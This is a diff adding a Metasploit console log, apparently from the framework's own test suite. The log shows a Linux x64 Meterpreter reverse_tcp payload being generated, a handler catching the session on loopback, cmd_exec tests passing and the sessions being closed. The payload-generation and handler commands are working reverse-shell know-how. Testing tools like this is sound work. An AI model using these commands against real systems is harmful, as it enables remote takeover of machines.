@@ -1,0 +1,42 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use linux/x64/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240117-3245-7fmy2mtxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240117-3245-t0tblx -f elf AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240117-3245-k87qyptxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240117-3245-7fmy2mtxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240117-3245-t0tblx...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:39586) at 2024-01-17 18:01:59 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Running against session 1
+[*] Session type is meterpreter and platform is linux
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+[+] should return the result of echo
+[+] should return the full response after sleeping
+[+] should return the full response after sleeping
+[+] should return the result of echo 10 times
+[*] Finished cmd_exec tests
+[*] Testing complete in 9.32 seconds
+[*] Passed: 7; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> 
